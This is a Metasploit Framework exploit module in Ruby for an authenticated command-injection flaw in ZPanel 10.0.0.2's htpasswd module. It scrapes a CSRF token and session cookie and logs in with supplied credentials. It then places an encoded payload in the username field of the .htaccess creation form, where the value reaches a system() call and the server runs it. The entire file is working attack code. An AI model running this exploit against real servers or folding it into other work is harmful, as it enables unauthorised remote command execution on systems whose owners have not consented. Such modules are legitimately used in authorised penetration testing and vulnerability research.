##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ZPanel 10.0.0.2 htpasswd 
Module Username Command Execution",
			'Description'    => %q{
				This module exploits a vulnerability 
found in ZPanel's htpasswd module. When
				creating .htaccess using the htpasswd 
module, the username field can be used to
				inject system commands, which is passed 
on to a system() function for executing
				the system's htpasswd's command.

				Please note: In order to use this 
module, you must have a valid account to login
				to ZPanel.  An account part of any of 
the default groups should suffice, such as:
				Administrators, Resellers, or Users 
(Clients).  By default, there's already a
				'zadmin' user, but the password is 
randomly generated.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'shachibista',  # Original 
discovery
					'sinn3r'        # Metasploit
				],
			'References'     =>
				[
					['OSVDB', '94038'],
					['URL', 
'https://github.com/bobsta63/zpanelx/commit/fe9cec7a8164801e2b3755b7abeabdd607f97906'],
					['URL', 
'http://forums.zpanelcp.com/showthread.php?27898-Serious-Remote-Execution-Exploit-in-Zpanel-10-0-0-2']
				],
			'Arch'           => ARCH_CMD,
			'Platform'       => 'unix',
			'Targets'        =>
				[
					[ 'ZPanel 10.0.0.2 on Linux', {} 
]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jun 7 2013",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The 
base path to ZPanel', '/']),
				OptString.new('USERNAME', [true, 'The 
username to authenticate as']),
				OptString.new('PASSWORD', [true, 'The 
password to authenticate with'])
			], self.class)
	end


	def peer
		"#{rhost}:#{rport}"
	end


	def check
		res = send_request_raw({'uri' => 
normalize_uri(target_uri.path)})
		if not res
			print_error("#{peer} - Connection timed out")
			return Exploit::CheckCode::Unknown
		end

		if res.body =~ /This server is running: ZPanel/
			return Exploit::CheckCode::Detected
		end

		return Exploit::CheckCode::Safe
	end


	def login(base, token, cookie)
		res  = send_request_cgi({
			'method'    => 'POST',
			'uri'       => normalize_uri(base, 'index.php'),
			'cookie'    => cookie,
			'vars_post' => {
				'inUsername' => datastore['USERNAME'],
				'inPassword' => datastore['PASSWORD'],
				'sublogin2'  => 'LogIn',
				'csfr_token' => token
			}
		})

		if not res
			fail_with(Exploit::Failure::Unknown, "#{peer} - 
Connection timed out")
		elsif res.body =~ /Application Error/ or 
res.headers['location'].to_s =~ /invalidlogin/
			fail_with(Exploit::Failure::NoAccess, "#{peer} - 
Login failed")
		end

		
res.headers['Set-Cookie'].to_s.scan(/(zUserSaltCookie=[a-z0-9]+)/).flatten[0] 
|| ''
	end


	def get_csfr_info(base, path='index.php', cookie='', vars={})
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => normalize_uri(base),
			'cookie'   => cookie,
			'vars_get' => vars
		})

		fail_with(Exploit::Failure::Unknown, "#{peer} - 
Connection timed out while collecting CSFR token") if not res

		token = res.body.scan(/<input type="hidden" 
name="csfr_token" value="(.+)">/).flatten[0] || ''
		sid   = 
res.headers['Set-Cookie'].to_s.scan(/(PHPSESSID=[a-z0-9]+)/).flatten[0] 
|| ''
		fail_with(Exploit::Failure::Unknown, "#{peer} - No CSFR 
token collected") if token.empty?

		return token, sid
	end


	def exec(base, token, sid, user_salt_cookie)
		fake_pass = Rex::Text.rand_text_alpha(5)
		cookie    = "#{sid}; #{user_salt_cookie}"

		send_request_cgi({
			'method'   => 'POST',
			'uri'      => normalize_uri(base),
			'cookie'   => cookie,
			'vars_get' => {
				'module' => 'htpasswd',
				'action' => 'CreateHTA'
			},
			'vars_post' => {
				'inAuthName'          => 
'Restricted+Area',
				'inHTUsername'        => 
";#{payload.encoded} #",
				'inHTPassword'        => fake_pass,
				'inConfirmHTPassword' => fake_pass,
				'inPath'              => '/',
				'csfr_token'          => token
			}
		})
	end


	def exploit
		base = target_uri.path

		token, sid = get_csfr_info(base)
		vprint_status("#{peer} - Token=#{token}, SID=#{sid}")

		user_salt_cookie = login(base, token, sid)
		print_good("#{peer} - Logged in as 
'#{datastore['USERNAME']}:#{datastore['PASSWORD']}'")

		vars = {'module'=>'htpasswd', 'selected'=>'Selected', 
'path'=>'/'}
		cookie = "#{sid}; #{user_salt_cookie}"
		token = get_csfr_info(base, '', cookie, vars)[0]
		vprint_status("#{peer} - Token=#{token}, SID=#{sid}")


		print_status("#{peer} - Executing payload...")
		exec(base, token, sid, user_salt_cookie)
	end

end


